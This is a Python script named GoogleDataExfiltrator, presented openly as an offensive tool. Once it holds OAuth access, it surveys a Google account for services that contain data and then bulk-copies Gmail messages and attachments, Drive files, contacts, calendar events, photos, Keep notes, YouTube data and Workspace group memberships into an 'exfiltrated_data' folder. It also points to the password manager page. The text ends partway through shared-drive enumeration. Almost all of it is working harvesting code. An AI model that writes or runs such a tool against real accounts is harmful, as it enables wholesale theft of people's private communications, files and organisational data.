#!/usr/bin/env python3

import os
import json
import pickle
import base64
import argparse
from datetime import datetime
from pathlib import Path

from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseDownload
import io

# Define OAuth 2.0 scopes for all Google services
SCOPES = [
    'https://www.googleapis.com/auth/gmail.readonly',
    'https://www.googleapis.com/auth/drive.readonly',
    'https://www.googleapis.com/auth/calendar.readonly',
    'https://www.googleapis.com/auth/contacts.readonly',
    'https://www.googleapis.com/auth/userinfo.profile',
    'https://www.googleapis.com/auth/userinfo.email',
    'https://www.googleapis.com/auth/photoslibrary.readonly',
    'https://www.googleapis.com/auth/tasks.readonly',
    'https://www.googleapis.com/auth/keep.readonly',
    'https://www.googleapis.com/auth/youtube.readonly',
    'https://www.googleapis.com/auth/admin.directory.user.readonly',
    'https://www.googleapis.com/auth/admin.directory.group.readonly',
    'https://www.googleapis.com/auth/admin.directory.orgunit.readonly',
    'https://www.googleapis.com/auth/admin.directory.domain.readonly',
    'https://www.googleapis.com/auth/cloud-identity.groups.readonly',
]

class GoogleDataExfiltrator:
    def __init__(self, output_dir='exfiltrated_data', limits=None):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.creds = None
        self.services = {}
        
        # Default limits to prevent indefinite execution
        self.limits = limits or {
            'gmail_messages': 100,      # Max emails to download
            'drive_files': 50,          # Max files to download
            'calendar_events': 1000,    # Max events per calendar
            'contacts': None,           # None = unlimited
            'photos': 50,               # Max photos to download
            'tasks': None,              # None = unlimited
            'keep_notes': 100,          # Max notes to download
            'youtube_videos': 500       # Max liked videos
        }
        
        self.is_workspace = False
        self.is_admin = False
        
    def authenticate(self, credentials_file='credentials.json'):
        """Authenticate using OAuth 2.0"""
        token_file = 'token.pickle'
        
        if os.path.exists(token_file):
            with open(token_file, 'rb') as token:
                self.creds = pickle.load(token)
        
        if not self.creds or not self.creds.valid:
            if self.creds and self.creds.expired and self.creds.refresh_token:
                self.creds.refresh(Request())
            else:
                if not os.path.exists(credentials_file):
                    print(f"ERROR: {credentials_file} not found!")
                    print("\nTo get credentials:")
                    print("1. Go to https://console.cloud.google.com/")
                    print("2. Create a new project or select existing")
                    print("3. Enable Gmail, Drive, Calendar, and People APIs")
                    print("4. Create OAuth 2.0 credentials (Desktop app)")
                    print("5. Download and save as 'credentials.json'")
                    return False
                
                flow = InstalledAppFlow.from_client_secrets_file(
                    credentials_file, SCOPES)
                self.creds = flow.run_local_server(port=0)
            
            with open(token_file, 'wb') as token:
                pickle.dump(self.creds, token)
        
        print("[+] Authentication successful!")
        return True
    
    def initialize_services(self):
        """Initialize all Google API services"""
        try:
            self.services['gmail'] = build('gmail', 'v1', credentials=self.creds)
            self.services['drive'] = build('drive', 'v3', credentials=self.creds)
            self.services['calendar'] = build('calendar', 'v3', credentials=self.creds)
            self.services['people'] = build('people', 'v1', credentials=self.creds)
            self.services['photoslibrary'] = build('photoslibrary', 'v1', credentials=self.creds, static_discovery=False)
            self.services['tasks'] = build('tasks', 'v1', credentials=self.creds)
            self.services['keep'] = build('keep', 'v1', credentials=self.creds)
            self.services['youtube'] = build('youtube', 'v3', credentials=self.creds)
            
            # Try to initialize admin services (will fail for non-admin users)
            try:
                self.services['admin_directory'] = build('admin', 'directory_v1', credentials=self.creds)
                self.services['cloudidentity'] = build('cloudidentity', 'v1', credentials=self.creds)
                print("[+] All services initialized (including admin services)")
                self.is_admin = True
            except Exception:
                print("[+] All services initialized (admin services not available)")
                self.is_admin = False
            
            # Detect if this is a Workspace account
            try:
                profile = self.services['gmail'].users().getProfile(userId='me').execute()
                email = profile.get('emailAddress', '')
                # Workspace accounts typically have custom domains, not @gmail.com
                if not email.endswith('@gmail.com'):
                    self.is_workspace = True
                    print(f"[+] Workspace account detected: {email}")
                else:
                    print(f"[+] Personal Gmail account: {email}")
            except:
                pass
            
            return True
        except Exception as e:
            print(f"[-] Error initializing services: {e}")
            print("[!] Note: Some APIs may need to be enabled in Google Cloud Console")
            return False
    
    def probe_active_services(self):
        """Probe account to detect which services are active and contain data"""
        print("\n" + "="*60)
        print("Probing account for active services...")
        print("="*60 + "\n")
        
        active_services = {}
        
        # Probe Gmail
        print("[*] Probing Gmail...", end=" ")
        try:
            profile = self.services['gmail'].users().getProfile(userId='me').execute()
            message_count = profile.get('messagesTotal', 0)
            if message_count > 0:
                active_services['gmail'] = {
                    'active': True,
                    'email': profile.get('emailAddress'),
                    'messages': message_count,
                    'threads': profile.get('threadsTotal', 0)
                }
                print(f"✓ ACTIVE ({message_count} messages)")
            else:
                active_services['gmail'] = {'active': False, 'reason': 'No messages'}
                print("✗ Empty")
        except Exception as e:
            active_services['gmail'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Probe Google Drive
        print("[*] Probing Google Drive...", end=" ")
        try:
            results = self.services['drive'].files().list(pageSize=1).execute()
            files = results.get('files', [])
            if files:
                # Get storage info
                about = self.services['drive'].about().get(fields='storageQuota').execute()
                storage = about.get('storageQuota', {})
                active_services['drive'] = {
                    'active': True,
                    'has_files': True,
                    'storage_used': storage.get('usage', 'Unknown')
                }
                print(f"✓ ACTIVE (Files found)")
            else:
                active_services['drive'] = {'active': False, 'reason': 'No files'}
                print("✗ Empty")
        except Exception as e:
            active_services['drive'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Probe Google Calendar
        print("[*] Probing Google Calendar...", end=" ")
        try:
            calendars_result = self.services['calendar'].calendarList().list().execute()
            calendars = calendars_result.get('items', [])
            if calendars:
                # Check if any calendar has events
                has_events = False
                total_events = 0
                for calendar in calendars:
                    try:
                        events_result = self.services['calendar'].events().list(
                            calendarId=calendar['id'],
                            maxResults=1
                        ).execute()
                        if events_result.get('items'):
                            has_events = True
                            # Count total events
                            events_count = self.services['calendar'].events().list(
                                calendarId=calendar['id']
                            ).execute()
                            total_events += len(events_count.get('items', []))
                    except:
                        pass
                
                active_services['calendar'] = {
                    'active': has_events,
                    'calendars': len(calendars),
                    'events': total_events if has_events else 0
                }
                if has_events:
                    print(f"✓ ACTIVE ({len(calendars)} calendars, {total_events} events)")
                else:
                    print(f"✗ Empty ({len(calendars)} calendars, no events)")
            else:
                active_services['calendar'] = {'active': False, 'reason': 'No calendars'}
                print("✗ No calendars")
        except Exception as e:
            active_services['calendar'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Probe Google Contacts
        print("[*] Probing Google Contacts...", end=" ")
        try:
            results = self.services['people'].people().connections().list(
                resourceName='people/me',
                pageSize=1,
                personFields='names'
            ).execute()
            connections = results.get('connections', [])
            if connections:
                # Get total count
                total = results.get('totalPeople', 0)
                active_services['contacts'] = {
                    'active': True,
                    'total': total
                }
                print(f"✓ ACTIVE ({total} contacts)")
            else:
                active_services['contacts'] = {'active': False, 'reason': 'No contacts'}
                print("✗ Empty")
        except Exception as e:
            active_services['contacts'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Probe Google Photos
        print("[*] Probing Google Photos...", end=" ")
        try:
            results = self.services['photoslibrary'].mediaItems().list(pageSize=1).execute()
            items = results.get('mediaItems', [])
            if items:
                active_services['photos'] = {
                    'active': True,
                    'has_media': True
                }
                print("✓ ACTIVE (Photos/videos found)")
            else:
                active_services['photos'] = {'active': False, 'reason': 'No media'}
                print("✗ Empty")
        except Exception as e:
            active_services['photos'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Probe Google Tasks
        print("[*] Probing Google Tasks...", end=" ")
        try:
            task_lists = self.services['tasks'].tasklists().list().execute()
            lists = task_lists.get('items', [])
            if lists:
                # Check if any list has tasks
                has_tasks = False
                total_tasks = 0
                for task_list in lists:
                    tasks = self.services['tasks'].tasks().list(
                        tasklist=task_list['id']
                    ).execute()
                    if tasks.get('items'):
                        has_tasks = True
                        total_tasks += len(tasks.get('items', []))
                
                active_services['tasks'] = {
                    'active': has_tasks,
                    'lists': len(lists),
                    'tasks': total_tasks
                }
                if has_tasks:
                    print(f"✓ ACTIVE ({len(lists)} lists, {total_tasks} tasks)")
                else:
                    print(f"✗ Empty ({len(lists)} lists, no tasks)")
            else:
                active_services['tasks'] = {'active': False, 'reason': 'No task lists'}
                print("✗ No task lists")
        except Exception as e:
            active_services['tasks'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Probe Google Keep
        print("[*] Probing Google Keep...", end=" ")
        try:
            results = self.services['keep'].notes().list(pageSize=1).execute()
            notes = results.get('notes', [])
            if notes:
                active_services['keep'] = {
                    'active': True,
                    'has_notes': True
                }
                print("✓ ACTIVE (Notes found)")
            else:
                active_services['keep'] = {'active': False, 'reason': 'No notes'}
                print("✗ Empty")
        except Exception as e:
            active_services['keep'] = {'active': False, 'reason': str(e)}
            print(f"✗ Not available (likely requires Workspace)")
        
        # Probe YouTube
        print("[*] Probing YouTube...", end=" ")
        try:
            # Check for channel
            channel_results = self.services['youtube'].channels().list(
                part='snippet,statistics',
                mine=True
            ).execute()
            
            if channel_results.get('items'):
                channel = channel_results['items'][0]
                stats = channel.get('statistics', {})
                
                # Check for subscriptions
                subs_result = self.services['youtube'].subscriptions().list(
                    part='snippet',
                    mine=True,
                    maxResults=1
                ).execute()
                
                has_data = (
                    int(stats.get('videoCount', 0)) > 0 or
                    subs_result.get('items') or
                    int(stats.get('playlistCount', 0)) > 0
                )
                
                active_services['youtube'] = {
                    'active': has_data,
                    'channel_name': channel['snippet'].get('title'),
                    'videos': stats.get('videoCount', 0),
                    'subscribers': stats.get('subscriberCount', 0)
                }
                if has_data:
                    print(f"✓ ACTIVE (Channel: {channel['snippet'].get('title')})")
                else:
                    print("✗ No activity")
            else:
                active_services['youtube'] = {'active': False, 'reason': 'No channel'}
                print("✗ No channel")
        except Exception as e:
            active_services['youtube'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Summary
        print("\n" + "="*60)
        print("Reconnaissance Summary")
        print("="*60)
        active_count = sum(1 for s in active_services.values() if s.get('active'))
        print(f"\nActive services: {active_count}/{len(active_services)}")
        print("\nServices with data:")
        for service, info in active_services.items():
            if info.get('active'):
                print(f"  ✓ {service.upper()}")
        
        print("\nInactive/Empty services:")
        for service, info in active_services.items():
            if not info.get('active'):
                reason = info.get('reason', 'Unknown')
                print(f"  ✗ {service.upper()} - {reason}")
        
        print("="*60 + "\n")
        
        return active_services
    
    def exfiltrate_gmail(self):
        """Exfiltrate Gmail emails and attachments"""
        print("\n[*] Starting Gmail exfiltration...")
        gmail_dir = self.output_dir / 'gmail'
        gmail_dir.mkdir(exist_ok=True)
        
        attachments_dir = gmail_dir / 'attachments'
        attachments_dir.mkdir(exist_ok=True)
        
        try:
            # Get user profile
            profile = self.services['gmail'].users().getProfile(userId='me').execute()
            with open(gmail_dir / 'profile.json', 'w') as f:
                json.dump(profile, f, indent=2)
            print(f"[+] Email: {profile['emailAddress']}")
            print(f"[+] Total messages: {profile['messagesTotal']}")
            
            # Get all labels
            labels_result = self.services['gmail'].users().labels().list(userId='me').execute()
            labels = labels_result.get('labels', [])
            with open(gmail_dir / 'labels.json', 'w') as f:
                json.dump(labels, f, indent=2)
            print(f"[+] Retrieved {len(labels)} labels")
            
            # Get all messages
            messages = []
            page_token = None
            
            while True:
                results = self.services['gmail'].users().messages().list(
                    userId='me', pageToken=page_token).execute()
                messages.extend(results.get('messages', []))
                page_token = results.get('nextPageToken')
                
                if not page_token:
                    break
                print(f"[+] Retrieved {len(messages)} message IDs so far...")
            
            print(f"[+] Total messages to download: {len(messages)}")
            
            # Apply limit
            download_limit = self.limits['gmail_messages']
            messages_to_download = messages[:download_limit] if download_limit else messages
            
            if download_limit and len(messages) > download_limit:
                print(f"[!] Limiting download to {download_limit} messages (out of {len(messages)} total)")
            
            # Download full message content
            emails_data = []
            for idx, msg in enumerate(messages_to_download):
                try:
                    message = self.services['gmail'].users().messages().get(
                        userId='me', id=msg['id'], format='full').execute()
                    emails_data.append(message)
                    
                    # Download attachments
                    if 'parts' in message['payload']:
                        self._download_attachments(message, attachments_dir)
                    
                    if (idx + 1) % 10 == 0:
                        print(f"[+] Downloaded {idx + 1}/{len(messages_to_download)} messages")
                except Exception as e:
                    print(f"[-] Error downloading message {msg['id']}: {e}")
            
            with open(gmail_dir / 'emails.json', 'w') as f:
                json.dump(emails_data, f, indent=2)
            
            print(f"[+] Gmail exfiltration complete: {len(emails_data)} emails saved")
            
        except Exception as e:
            print(f"[-] Error in Gmail exfiltration: {e}")
    
    def _download_attachments(self, message, attachments_dir):
        """Download email attachments"""
        parts = message['payload'].get('parts', [])
        for part in parts:
            if part.get('filename'):
                attachment_id = part['body'].get('attachmentId')
                if attachment_id:
                    try:
                        attachment = self.services['gmail'].users().messages().attachments().get(
                            userId='me', messageId=message['id'], id=attachment_id).execute()
                        
                        file_data = base64.urlsafe_b64decode(attachment['data'])
                        filename = part['filename']
                        filepath = attachments_dir / f"{message['id']}_{filename}"
                        
                        with open(filepath, 'wb') as f:
                            f.write(file_data)
                    except Exception as e:
                        print(f"[-] Error downloading attachment: {e}")
    
    def exfiltrate_drive(self):
        """Exfiltrate Google Drive files"""
        print("\n[*] Starting Google Drive exfiltration...")
        drive_dir = self.output_dir / 'drive'
        drive_dir.mkdir(exist_ok=True)
        
        try:
            # Get drive about info
            about = self.services['drive'].about().get(fields='*').execute()
            with open(drive_dir / 'about.json', 'w') as f:
                json.dump(about, f, indent=2)
            print(f"[+] Drive storage used: {about.get('storageQuota', {}).get('usage', 'N/A')}")
            
            # List all files
            files = []
            page_token = None
            
            while True:
                results = self.services['drive'].files().list(
                    pageSize=100,
                    fields="nextPageToken, files(id, name, mimeType, size, createdTime, modifiedTime, owners, parents)",
                    pageToken=page_token
                ).execute()
                
                files.extend(results.get('files', []))
                page_token = results.get('nextPageToken')
                
                if not page_token:
                    break
                print(f"[+] Retrieved {len(files)} files so far...")
            
            with open(drive_dir / 'files_list.json', 'w') as f:
                json.dump(files, f, indent=2)
            print(f"[+] Total files found: {len(files)}")
            
            # Apply limit
            download_limit = self.limits['drive_files']
            files_to_download = files[:download_limit] if download_limit else files
            
            if download_limit and len(files) > download_limit:
                print(f"[!] Limiting download to {download_limit} files (out of {len(files)} total)")
            
            # Download files
            files_dir = drive_dir / 'files'
            files_dir.mkdir(exist_ok=True)
            
            for idx, file in enumerate(files_to_download):
                try:
                    file_id = file['id']
                    file_name = file['name']
                    mime_type = file['mimeType']
                    
                    # Handle Google Docs/Sheets/Slides by exporting
                    if 'google-apps' in mime_type:
                        self._export_google_file(file_id, file_name, mime_type, files_dir)
                    else:
                        request = self.services['drive'].files().get_media(fileId=file_id)
                        filepath = files_dir / file_name
                        
                        fh = io.FileIO(str(filepath), 'wb')
                        downloader = MediaIoBaseDownload(fh, request)
                        
                        done = False
                        while not done:
                            status, done = downloader.next_chunk()
                        
                        fh.close()
                    
                    if (idx + 1) % 10 == 0:
                        print(f"[+] Downloaded {idx + 1}/{len(files_to_download)} files")
                        
                except Exception as e:
                    print(f"[-] Error downloading file {file.get('name', 'unknown')}: {e}")
            
            print(f"[+] Drive exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Drive exfiltration: {e}")
    
    def _export_google_file(self, file_id, file_name, mime_type, output_dir):
        """Export Google Docs/Sheets/Slides to standard formats"""
        export_formats = {
            'application/vnd.google-apps.document': ('application/pdf', '.pdf'),
            'application/vnd.google-apps.spreadsheet': ('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', '.xlsx'),
            'application/vnd.google-apps.presentation': ('application/pdf', '.pdf'),
            'application/vnd.google-apps.drawing': ('application/pdf', '.pdf'),
        }
        
        if mime_type in export_formats:
            export_mime, ext = export_formats[mime_type]
            try:
                request = self.services['drive'].files().export_media(
                    fileId=file_id, mimeType=export_mime)
                
                filepath = output_dir / f"{file_name}{ext}"
                fh = io.FileIO(str(filepath), 'wb')
                downloader = MediaIoBaseDownload(fh, request)
                
                done = False
                while not done:
                    status, done = downloader.next_chunk()
                
                fh.close()
            except Exception as e:
                print(f"[-] Error exporting Google file {file_name}: {e}")
    
    def exfiltrate_calendar(self):
        """Exfiltrate Google Calendar events"""
        print("\n[*] Starting Google Calendar exfiltration...")
        calendar_dir = self.output_dir / 'calendar'
        calendar_dir.mkdir(exist_ok=True)
        
        try:
            # Get all calendars
            calendars_result = self.services['calendar'].calendarList().list().execute()
            calendars = calendars_result.get('items', [])
            
            with open(calendar_dir / 'calendars.json', 'w') as f:
                json.dump(calendars, f, indent=2)
            print(f"[+] Found {len(calendars)} calendars")
            
            # Get events from each calendar
            all_events = {}
            event_limit = self.limits['calendar_events']
            
            for calendar in calendars:
                calendar_id = calendar['id']
                calendar_name = calendar.get('summary', calendar_id)
                
                try:
                    events = []
                    page_token = None
                    
                    while True:
                        events_result = self.services['calendar'].events().list(
                            calendarId=calendar_id,
                            pageToken=page_token,
                            singleEvents=True,
                            orderBy='startTime',
                            maxResults=100
                        ).execute()
                        
                        events.extend(events_result.get('items', []))
                        page_token = events_result.get('nextPageToken')
                        
                        # Apply per-calendar limit
                        if event_limit and len(events) >= event_limit:
                            events = events[:event_limit]
                            print(f"[!] Limited to {event_limit} events for calendar '{calendar_name}'")
                            break
                        
                        if not page_token:
                            break
                    
                    all_events[calendar_name] = events
                    print(f"[+] Retrieved {len(events)} events from '{calendar_name}'")
                    
                except Exception as e:
                    print(f"[-] Error retrieving events from {calendar_name}: {e}")
            
            with open(calendar_dir / 'all_events.json', 'w') as f:
                json.dump(all_events, f, indent=2)
            
            print(f"[+] Calendar exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Calendar exfiltration: {e}")
    
    def exfiltrate_contacts(self):
        """Exfiltrate Google Contacts"""
        print("\n[*] Starting Google Contacts exfiltration...")
        contacts_dir = self.output_dir / 'contacts'
        contacts_dir.mkdir(exist_ok=True)
        
        try:
            # Get all contacts
            contacts = []
            page_token = None
            contact_limit = self.limits['contacts']
            
            while True:
                results = self.services['people'].people().connections().list(
                    resourceName='people/me',
                    pageSize=100,
                    personFields='names,emailAddresses,phoneNumbers,organizations,addresses,birthdays,biographies',
                    pageToken=page_token
                ).execute()
                
                connections = results.get('connections', [])
                contacts.extend(connections)
                page_token = results.get('nextPageToken')
                
                # Apply limit
                if contact_limit and len(contacts) >= contact_limit:
                    contacts = contacts[:contact_limit]
                    print(f"[!] Limited to {contact_limit} contacts")
                    break
                
                if not page_token:
                    break
                print(f"[+] Retrieved {len(contacts)} contacts so far...")
            
            with open(contacts_dir / 'contacts.json', 'w') as f:
                json.dump(contacts, f, indent=2)
            
            print(f"[+] Total contacts retrieved: {len(contacts)}")
            print(f"[+] Contacts exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Contacts exfiltration: {e}")
    
    def exfiltrate_photos(self):
        """Exfiltrate Google Photos metadata and images"""
        print("\n[*] Starting Google Photos exfiltration...")
        photos_dir = self.output_dir / 'photos'
        photos_dir.mkdir(exist_ok=True)
        
        images_dir = photos_dir / 'images'
        images_dir.mkdir(exist_ok=True)
        
        try:
            # Get all media items
            media_items = []
            page_token = None
            photo_limit = self.limits['photos']
            
            print("[+] Retrieving photo metadata...")
            while True:
                body = {'pageSize': 100}
                if page_token:
                    body['pageToken'] = page_token
                
                results = self.services['photoslibrary'].mediaItems().list(**body).execute()
                
                items = results.get('mediaItems', [])
                media_items.extend(items)
                page_token = results.get('nextPageToken')
                
                # Apply limit
                if photo_limit and len(media_items) >= photo_limit:
                    media_items = media_items[:photo_limit]
                    print(f"[!] Limited to {photo_limit} media items")
                    break
                
                if not page_token:
                    break
                print(f"[+] Retrieved {len(media_items)} media items so far...")
            
            # Save metadata
            with open(photos_dir / 'media_items.json', 'w') as f:
                json.dump(media_items, f, indent=2)
            print(f"[+] Total media items: {len(media_items)}")
            
            # Download photos
            print("[+] Downloading photos...")
            for idx, item in enumerate(media_items):
                try:
                    # Get download URL
                    base_url = item.get('baseUrl')
                    filename = item.get('filename', f'photo_{idx}.jpg')
                    
                    # Download the image
                    import requests
                    response = requests.get(f"{base_url}=d")
                    
                    if response.status_code == 200:
                        filepath = images_dir / filename
                        with open(filepath, 'wb') as f:
                            f.write(response.content)
                    
                    if (idx + 1) % 10 == 0:
                        print(f"[+] Downloaded {idx + 1}/{len(media_items)} photos")
                        
                except Exception as e:
                    print(f"[-] Error downloading photo {item.get('filename', 'unknown')}: {e}")
            
            # Get albums
            print("[+] Retrieving albums...")
            albums = []
            page_token = None
            
            while True:
                body = {'pageSize': 50}
                if page_token:
                    body['pageToken'] = page_token
                
                results = self.services['photoslibrary'].albums().list(**body).execute()
                
                items = results.get('albums', [])
                albums.extend(items)
                page_token = results.get('nextPageToken')
                
                if not page_token:
                    break
            
            with open(photos_dir / 'albums.json', 'w') as f:
                json.dump(albums, f, indent=2)
            print(f"[+] Retrieved {len(albums)} albums")
            
            print(f"[+] Photos exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Photos exfiltration: {e}")
            print("[!] Make sure Photos Library API is enabled in Google Cloud Console")
    
    def exfiltrate_tasks(self):
        """Exfiltrate Google Tasks"""
        print("\n[*] Starting Google Tasks exfiltration...")
        tasks_dir = self.output_dir / 'tasks'
        tasks_dir.mkdir(exist_ok=True)
        
        try:
            # Get all task lists
            task_lists_result = self.services['tasks'].tasklists().list().execute()
            task_lists = task_lists_result.get('items', [])
            
            with open(tasks_dir / 'task_lists.json', 'w') as f:
                json.dump(task_lists, f, indent=2)
            print(f"[+] Found {len(task_lists)} task lists")
            
            # Get tasks from each list
            all_tasks = {}
            for task_list in task_lists:
                list_id = task_list['id']
                list_title = task_list.get('title', list_id)
                
                try:
                    tasks = []
                    page_token = None
                    
                    while True:
                        results = self.services['tasks'].tasks().list(
                            tasklist=list_id,
                            pageToken=page_token,
                            showCompleted=True,
                            showHidden=True
                        ).execute()
                        
                        tasks.extend(results.get('items', []))
                        page_token = results.get('nextPageToken')
                        
                        if not page_token:
                            break
                    
                    all_tasks[list_title] = tasks
                    print(f"[+] Retrieved {len(tasks)} tasks from '{list_title}'")
                    
                except Exception as e:
                    print(f"[-] Error retrieving tasks from {list_title}: {e}")
            
            with open(tasks_dir / 'all_tasks.json', 'w') as f:
                json.dump(all_tasks, f, indent=2)
            
            print(f"[+] Tasks exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Tasks exfiltration: {e}")
    
    def exfiltrate_keep(self):
        """Exfiltrate Google Keep notes"""
        print("\n[*] Starting Google Keep exfiltration...")
        keep_dir = self.output_dir / 'keep'
        keep_dir.mkdir(exist_ok=True)
        
        try:
            # Get all notes
            notes = []
            page_token = None
            note_limit = self.limits['keep_notes']
            
            while True:
                body = {'pageSize': 100}
                if page_token:
                    body['pageToken'] = page_token
                
                results = self.services['keep'].notes().list(**body).execute()
                
                items = results.get('notes', [])
                notes.extend(items)
                page_token = results.get('nextPageToken')
                
                # Apply limit
                if note_limit and len(notes) >= note_limit:
                    notes = notes[:note_limit]
                    print(f"[!] Limited to {note_limit} notes")
                    break
                
                if not page_token:
                    break
                print(f"[+] Retrieved {len(notes)} notes so far...")
            
            with open(keep_dir / 'notes.json', 'w') as f:
                json.dump(notes, f, indent=2)
            
            print(f"[+] Total Keep notes retrieved: {len(notes)}")
            print(f"[+] Keep exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Keep exfiltration: {e}")
            print("[!] Note: Keep API requires Workspace domain and special permissions")
    
    def exfiltrate_youtube(self):
        """Exfiltrate YouTube data (subscriptions, playlists, liked videos)"""
        print("\n[*] Starting YouTube exfiltration...")
        youtube_dir = self.output_dir / 'youtube'
        youtube_dir.mkdir(exist_ok=True)
        
        try:
            # Get subscriptions
            print("[+] Retrieving subscriptions...")
            subscriptions = []
            page_token = None
            
            while True:
                results = self.services['youtube'].subscriptions().list(
                    part='snippet,contentDetails',
                    mine=True,
                    maxResults=50,
                    pageToken=page_token
                ).execute()
                
                subscriptions.extend(results.get('items', []))
                page_token = results.get('nextPageToken')
                
                if not page_token:
                    break
            
            with open(youtube_dir / 'subscriptions.json', 'w') as f:
                json.dump(subscriptions, f, indent=2)
            print(f"[+] Retrieved {len(subscriptions)} subscriptions")
            
            # Get playlists
            print("[+] Retrieving playlists...")
            playlists = []
            page_token = None
            
            while True:
                results = self.services['youtube'].playlists().list(
                    part='snippet,contentDetails',
                    mine=True,
                    maxResults=50,
                    pageToken=page_token
                ).execute()
                
                playlists.extend(results.get('items', []))
                page_token = results.get('nextPageToken')
                
                if not page_token:
                    break
            
            with open(youtube_dir / 'playlists.json', 'w') as f:
                json.dump(playlists, f, indent=2)
            print(f"[+] Retrieved {len(playlists)} playlists")
            
            # Get liked videos
            print("[+] Retrieving liked videos...")
            liked_videos = []
            page_token = None
            video_limit = self.limits['youtube_videos']
            
            while True:
                results = self.services['youtube'].videos().list(
                    part='snippet,contentDetails,statistics',
                    myRating='like',
                    maxResults=50,
                    pageToken=page_token
                ).execute()
                
                liked_videos.extend(results.get('items', []))
                page_token = results.get('nextPageToken')
                
                # Apply limit
                if video_limit and len(liked_videos) >= video_limit:
                    liked_videos = liked_videos[:video_limit]
                    print(f"[!] Limited to {video_limit} liked videos")
                    break
                
                if not page_token:
                    break
            
            with open(youtube_dir / 'liked_videos.json', 'w') as f:
                json.dump(liked_videos, f, indent=2)
            print(f"[+] Retrieved {len(liked_videos)} liked videos")
            
            # Get channel info
            print("[+] Retrieving channel information...")
            channel_results = self.services['youtube'].channels().list(
                part='snippet,contentDetails,statistics',
                mine=True
            ).execute()
            
            with open(youtube_dir / 'channel_info.json', 'w') as f:
                json.dump(channel_results, f, indent=2)
            print(f"[+] Retrieved channel information")
            
            print(f"[+] YouTube exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in YouTube exfiltration: {e}")
    
    def check_password_manager(self):
        """Check for Google Password Manager access and provide URL"""
        print("\n[*] Checking Google Password Manager...")
        
        print("\n" + "="*60)
        print("Google Password Manager Detection")
        print("="*60)
        
        print("\nhttps://passwords.google.com")
        
        print("\n" + "="*60)
        print("Password Manager check complete")
        print("="*60)
    
    def exfiltrate_workspace_groups(self):
        """Exfiltrate Google Groups membership (non-admin: user's groups only)"""
        print("\n[*] Starting Google Groups exfiltration...")
        groups_dir = self.output_dir / 'workspace_groups'
        groups_dir.mkdir(exist_ok=True)
        
        if not self.is_workspace:
            print("[!] Not a Workspace account - skipping group enumeration")
            return
        
        try:
            # Get user's groups (works for non-admin users)
            print("[+] Retrieving groups user belongs to...")
            my_groups = []
            page_token = None
            
            # Using Cloud Identity Groups API
            if 'cloudidentity' in self.services:
                try:
                    while True:
                        results = self.services['cloudidentity'].groups().memberships().list(
                            parent='groups/-',
                            pageToken=page_token
                        ).execute()
                        
                        memberships = results.get('memberships', [])
                        my_groups.extend(memberships)
                        page_token = results.get('nextPageToken')
                        
                        if not page_token:
                            break
                except Exception as e:
                    print(f"[-] Cloud Identity API failed: {e}")
            
            # Try Directory API for groups (requires admin)
            if self.is_admin and 'admin_directory' in self.services:
                try:
                    print("[+] Admin access detected - enumerating ALL groups...")
                    all_groups = []
                    page_token = None
                    
                    while True:
                        results = self.services['admin_directory'].groups().list(
                            customer='my_customer',
                            maxResults=200,
                            pageToken=page_token
                        ).execute()
                        
                        groups = results.get('groups', [])
                        all_groups.extend(groups)
                        page_token = results.get('nextPageToken')
                        
                        if not page_token:
                            break
                        print(f"[+] Retrieved {len(all_groups)} groups so far...")
                    
                    with open(groups_dir / 'all_groups.json', 'w') as f:
                        json.dump(all_groups, f, indent=2)
                    print(f"[+] Total groups in organization: {len(all_groups)}")
                    
                    # Get members for each group
                    print("[+] Enumerating group memberships...")
                    group_members = {}
                    
                    for idx, group in enumerate(all_groups[:50]):  # Limit to 50 groups for demo
                        group_email = group['email']
                        try:
                            members = []
                            page_token = None
                            
                            while True:
                                results = self.services['admin_directory'].members().list(
                                    groupKey=group_email,
                                    maxResults=200,
                                    pageToken=page_token
                                ).execute()
                                
                                members.extend(results.get('members', []))
                                page_token = results.get('nextPageToken')
                                
                                if not page_token:
                                    break
                            
                            group_members[group_email] = {
                                'group_info': group,
                                'members': members,
                                'member_count': len(members)
                            }
                            
                            if (idx + 1) % 10 == 0:
                                print(f"[+] Processed {idx + 1}/{min(50, len(all_groups))} groups")
                        except Exception as e:
                            print(f"[-] Error getting members for {group_email}: {e}")
                    
                    with open(groups_dir / 'group_memberships.json', 'w') as f:
                        json.dump(group_members, f, indent=2)
                    
                except Exception as e:
                    print(f"[-] Admin Directory API failed: {e}")
            
            # Save user's groups
            if my_groups:
                with open(groups_dir / 'my_groups.json', 'w') as f:
                    json.dump(my_groups, f, indent=2)
                print(f"[+] Retrieved {len(my_groups)} groups user belongs to")
            
            print(f"[+] Workspace Groups exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Workspace Groups exfiltration: {e}")
    
    def exfiltrate_workspace_shared_drives(self):
        """Exfiltrate Shared Drives (Team Drives) information"""
        print("\n[*] Starting Shared Drives exfiltration...")
        shared_drives_dir = self.output_dir / 'workspace_shared_drives'
        shared_drives_dir.mkdir(exist_ok=True)
        
        if not self.is_workspace:
            print("[!] Not a Workspace account - skipping Shared Drives enumeration")
            return
        
        try:
            # Get Shared Drives user has access to
            print("[+] Retrieving accessible Shared Drives...")
            shared_drives = []
            page_token = None
            
            while True:
                results = self.services['drive'].drives().list(
                    pageSize=100,
                    pageToken=page_token
                ).execute()
                
                drives = results.get('drives', [])
                shared_drives.extend(drives)
                page_token = results.get('nextPageToken')
                
                if not page_token:
                    break
                print(f"[+] Retrieved {len(shared_drives)} Shared Drives so far...")
            
